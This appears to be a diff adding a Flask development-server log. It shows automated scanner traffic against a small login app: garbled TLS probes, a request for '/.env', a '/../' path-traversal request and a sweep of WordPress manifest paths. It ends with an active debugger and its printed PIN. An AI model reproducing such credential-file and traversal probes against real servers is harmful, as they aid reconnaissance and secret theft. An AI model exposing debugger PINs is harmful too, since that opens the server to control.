+99.82.175.141 - - [11/Dec/2022 12:06:25] code 400, message Bad request version ('À\x14À')
+99.82.175.141 - - [11/Dec/2022 12:06:25] "   	!){£¿Ðgÿñ(A²¼9È''5¬&)   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+172.105.128.12 - - [11/Dec/2022 12:06:49] code 400, message Bad request version ('À\x14À')
+172.105.128.12 - - [11/Dec/2022 12:06:49] "   ¦¯ïèK¨6á6æêk'+ ß =»§lE¡ßïÎMlo   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+99.82.175.169 - - [11/Dec/2022 12:08:47] code 400, message Bad request version ('À\x14À')
+99.82.175.169 - - [11/Dec/2022 12:08:47] "   ÉÈÜ;×Çù2õ®}õÐ@BåciGâéê   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+13.248.119.42 - - [11/Dec/2022 12:16:57] "GET / HTTP/1.1" 200 -
+198.235.24.27 - - [11/Dec/2022 12:20:09] "GET / HTTP/1.1" 200 -
+135.125.246.110 - - [11/Dec/2022 12:20:31] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [11/Dec/2022 12:20:32] "GET /.env HTTP/1.1" 404 -
+162.142.125.10 - - [11/Dec/2022 12:34:30] "GET / HTTP/1.1" 200 -
+162.142.125.10 - - [11/Dec/2022 12:34:31] "GET / HTTP/1.1" 200 -
+162.142.125.10 - - [11/Dec/2022 12:34:31] code 505, message Invalid HTTP version (2.0)
+162.142.125.10 - - [11/Dec/2022 12:34:31] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+162.142.125.10 - - [11/Dec/2022 12:34:31] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+162.142.125.10 - - [11/Dec/2022 12:34:32] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+162.142.125.10 - - [11/Dec/2022 12:34:32] "GET /favicon.ico HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:39] "GET / HTTP/1.1" 200 -
+156.96.154.202 - - [11/Dec/2022 12:37:39] "GET / HTTP/1.1" 200 -
+156.96.154.202 - - [11/Dec/2022 12:37:39] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:40] "GET /xmlrpc.php?rsd HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:40] "GET / HTTP/1.1" 200 -
+156.96.154.202 - - [11/Dec/2022 12:37:41] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:41] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:41] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:42] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:42] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:43] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:43] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:43] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:44] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:44] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:45] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:45] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:45] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:46] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:46] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+156.96.154.202 - - [11/Dec/2022 12:37:47] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 -
+ * Detected change in '/home/ubuntu/dailylog/Login/app.py', reloading
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+MISSING_EMAIL
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 210-353-672
